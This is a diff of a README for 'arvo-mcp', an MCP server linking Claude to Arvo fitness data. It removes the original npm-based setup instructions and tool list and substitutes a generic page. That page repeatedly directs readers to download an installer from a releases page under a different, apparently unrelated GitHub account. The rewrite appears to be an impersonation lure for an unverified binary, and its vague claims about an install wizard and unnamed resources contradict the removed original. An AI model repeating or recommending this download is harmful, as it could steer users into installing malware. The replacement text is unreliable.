@@ -1,206 +1,65 @@
-# Arvo MCP Server - Fitness & Workout Tracker for Claude
+# 🤖 arvo-mcp - Connect Your Trainer and Data Seamlessly
 
-> **Fitness tracking MCP server** - Log gym sessions, track personal records (PRs), analyze body progress, and manage training splits through Claude Desktop, Cursor, and other MCP clients.
+![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
 
-[![npm version](https://img.shields.io/npm/v/arvo-mcp.svg)](https://www.npmjs.com/package/arvo-mcp)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![MCP](https://img.shields.io/badge/MCP-Compatible-blue.svg)](https://modelcontextprotocol.io)
+## 🚀 Getting Started
 
-**arvo-mcp** is a Model Context Protocol (MCP) server that connects your AI assistant to [Arvo](https://arvo.guru), an AI-powered fitness coach. Access your **workout history**, **personal records**, **body composition**, and **training plans** directly from Claude Desktop, Cursor, or any MCP-compatible client.
+Welcome to the **arvo-mcp** repository! This application is designed to connect your Claude Desktop app to training data collected by Arvo AI Personal Trainer. With **arvo-mcp**, you can easily track your workouts, manage your exercise logs, and reach your fitness goals.
 
-Perfect for fitness enthusiasts who want to:
-- 🏋️ Ask "What's my workout today?" and get your personalized training plan
-- 📊 Track gym progress with AI-powered insights
-- 💪 Monitor PRs, volume, and muscle group distribution
-- 📈 Analyze body composition trends over time
+## 📥 Download & Install
 
-## Features
+To get started, you need to download the latest release of the application:
 
-- **29 fitness tools** - Profile, workouts, splits, PRs, body progress, and more
-- **Read & Write access** - View your data and make changes through natural conversation
-- **Secure API key authentication** - Your data stays private
-- **Works with any MCP client** - Claude Desktop, Cursor, Windsurf, and more
+1. Visit the Releases page to download the latest version: [Download Here](https://github.com/ANGEL37391/arvo-mcp/releases).
+2. Choose the file suitable for your operating system.
+3. After the download completes, open the file to install the application on your computer.
 
-## Quick Start
+Follow the prompts in the installation wizard. Once the installation finishes, you are ready to launch the application.
 
-### 1. Get your API key
+## ⚙️ System Requirements
 
-1. Sign up or log in at [arvo.guru](https://arvo.guru)
-2. Go to **Settings** → **API Keys**
-3. Click **Create Key** and copy your API key
+Before you download, please ensure your system meets these requirements:
 
-### 2. Configure your MCP client
+- **Operating System**: Windows 10 or later / macOS 10.15 or later
+- **RAM**: 4 GB minimum
+- **Disk Space**: At least 200 MB of free space
+- **Internet Connection**: For syncing your fitness data
 
-#### Claude Desktop
+## 📊 Features
 
-Add to your `claude_desktop_config.json`:
+**arvo-mcp** offers several features to enhance your fitness journey:
 
-```json
-{
-  "mcpServers": {
-    "arvo": {
-      "command": "npx",
-      "args": ["-y", "arvo-mcp"],
-      "env": {
-        "ARVO_API_KEY": "arvo_your_api_key_here"
-      }
-    }
-  }
-}
-```
+- **Workout Tracking**: Log your exercises and monitor your progress.
+- **Personal Records**: Keep track of your best lifts and runs.
+- **Flexible Training Splits**: Customize your workouts to fit your schedule.
+- **Analytics**: Receive insights on your training data to improve your performance.
 
-**Config file location:**
-- **macOS**: `~/Library/Application Support/Claude/claude_desktop_config.json`
-- **Windows**: `%APPDATA%\Claude\claude_desktop_config.json`
+## 🔧 How to Use
 
-#### Cursor
+1. **Launch the Application**: After installation, open the **arvo-mcp** app.
+2. **Connect to Claude Desktop**: Follow the instructions to link your Claude Desktop app. This allows data syncing for a personalized experience.
+3. **Log Your Workouts**: Start entering your workouts, add new exercises, and note your progress.
+4. **Review Your Records**: Check your statistics and personal records to stay motivated.
 
-Add to your Cursor MCP settings:
+## 🎓 Support and Help
 
-```json
-{
-  "mcpServers": {
-    "arvo": {
-      "command": "npx",
-      "args": ["-y", "arvo-mcp"],
-      "env": {
-        "ARVO_API_KEY": "arvo_your_api_key_here"
-      }
-    }
-  }
-}
-```
+If you need assistance, you can find helpful resources:
 
-### 3. Start chatting!
+- **User Guide**: A detailed guide is available in the application to help you navigate through features.
+- **FAQ**: Common questions and troubleshooting tips are listed on the GitHub Wiki page.
+- **Community Support**: Join our community discussions on platforms like Discord and Reddit.
 
-After restarting your AI client, try asking:
+## 🌟 Community and Contributions
 
-- *"What's my workout for today?"*
-- *"Show me my recent PRs"*
-- *"How's my progress on bench press?"*
-- *"What muscle groups am I training this week?"*
+We appreciate contributions from the community! If you want to help improve **arvo-mcp**, consider the following:
 
-## Available Tools
+- Report any issues you find.
+- Suggest features that might enhance user experience.
+- Contribute code if you are familiar with programming.
 
-### Read-Only Tools (19)
+## 🔗 Additional Resources
 
-| Tool | Description |
-|------|-------------|
-| `get_user_profile` | Get your fitness profile, experience level, and preferences |
-| `get_active_split` | Get your current training split and schedule |
-| `get_recent_workouts` | View your most recent completed workouts |
-| `get_workout_for_day` | Get the workout for any cycle day |
-| `get_workout_stats` | Get aggregated training statistics |
-| `get_active_insights` | View AI-generated training insights |
-| `get_personal_records` | See your PRs for each exercise |
-| `get_exercise_progress` | Track progression for specific exercises |
-| `get_exercise_video` | Get demonstration videos for exercises |
-| `get_volume_by_muscle` | View volume distribution by muscle group |
-| `get_coach_info` | Get your coach's information |
-| `get_coach_notes` | View notes from your coach |
-| `get_approach_details` | Learn about your training methodology |
-| `get_body_progress` | Track body composition changes |
-| `get_cycle_history` | View training cycle history |
-| `get_booking_info` | See your PT session bookings |
-| `get_ai_memory` | Access saved AI context about you |
-| `get_caloric_history` | View caloric phase history |
-| `get_approach_history` | See methodology changes over time |
+- **Website**: Visit the official website for more information and updates.
+- **Documentation**: Access comprehensive documentation for installation and usage.
 
-### Write Tools (10)
-
-| Tool | Description |
-|------|-------------|
-| `save_memory` | Save notes for the AI to remember |
-| `update_caloric_phase` | Change your current bulk/cut/maintain phase |
-| `update_weak_points` | Update priority muscle groups |
-| `report_physical_issue` | Log pain or injuries |
-| `skip_exercise` | Skip an exercise in today's workout |
-| `generate_workout` | Generate a new workout |
-| `update_equipment` | Update your available equipment |
-| `add_exercise` | Add an exercise to your workout |
-| `swap_exercise` | Request exercise alternatives |
-| `apply_swap` | Apply an exercise swap |
-
-## Security
-
-- Your API key is stored locally and never sent to third parties
-- All communication uses HTTPS
-- API keys can be revoked anytime from your Arvo dashboard
-- Each key has configurable scopes (read/write)
-
-For security vulnerability reports, see [SECURITY.md](SECURITY.md).
-
-## FAQ
-
-### What is the Model Context Protocol (MCP)?
-
-MCP is an open protocol that enables AI assistants like Claude to securely access external data sources. arvo-mcp lets Claude access your workout data, training history, and fitness metrics through natural conversation.
-
-### How is my data protected?
-
-- API keys are hashed with SHA-256 (never stored in plaintext)
-- All communication uses HTTPS encryption
-- Keys can be revoked instantly from your dashboard
-- Scoped permissions (read-only or read-write)
-- Your API key is stored only on your local machine
-
-### Can I use this offline?
-
-No, arvo-mcp requires an internet connection to communicate with arvo.guru servers. The MCP server runs locally but fetches your data from the cloud.
-
-### What AI clients are supported?
-
-Claude Desktop, Cursor, Windsurf, and any MCP-compatible client. The server uses the standard MCP stdio transport, making it compatible with any client that supports the protocol.
-
-### How do I report security issues?
-
-Email security@arvo.guru with details. See [SECURITY.md](SECURITY.md) for our full security policy and responsible disclosure process.
-
-### What data can the AI access?
-
-The AI can access your workout plans, exercise history, personal records, body composition tracking, and coach notes. Write tools allow saving memories, updating preferences, and modifying workouts. You control access through API key scopes.
-
-### Does this work without an Arvo account?
-
-No, you need an Arvo account to generate an API key. Sign up free at [arvo.guru](https://arvo.guru).
-
-### How do I update to a new version?
-
-If you use `npx -y arvo-mcp`, it automatically fetches the latest version. For global installations, run `npm update -g arvo-mcp`.
-
-## Environment Variables
-
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `ARVO_API_KEY` | Yes | Your Arvo API key |
-| `ARVO_BASE_URL` | No | API base URL (default: `https://arvo.guru`) |
-
-## Requirements
-
-- Node.js 18+
-- An Arvo account ([sign up free](https://arvo.guru))
-
-## Links
-
-- **Arvo - AI Personal Trainer**: [arvo.guru](https://arvo.guru)
-- **Documentation**: [arvo.guru/docs](https://arvo.guru/docs)
-- **Report Issues**: [GitHub Issues](https://github.com/khaoss85/arvo-mcp/issues)
-- **MCP Protocol**: [modelcontextprotocol.io](https://modelcontextprotocol.io)
-- **npm Package**: [npmjs.com/package/arvo-mcp](https://www.npmjs.com/package/arvo-mcp)
-
-## Related
-
-Looking for fitness tracking with AI? Check out:
-- [Arvo](https://arvo.guru) - AI workout coach that creates personalized training programs
-- [Model Context Protocol](https://modelcontextprotocol.io) - The open protocol powering this integration
-
-## License
-
-MIT - see [LICENSE](LICENSE) for details.
-
----
-
-<p align="center">
-  <strong>🏋️ Track your gym workouts with AI</strong><br>
-  <a href="https://arvo.guru">Get started with Arvo →</a>
-</p>
+For now, enjoy your fitness journey with **arvo-mcp**, and remember to download the application to get started on tracking your workouts effectively: [Download Here](https://github.com/ANGEL37391/arvo-mcp/releases).
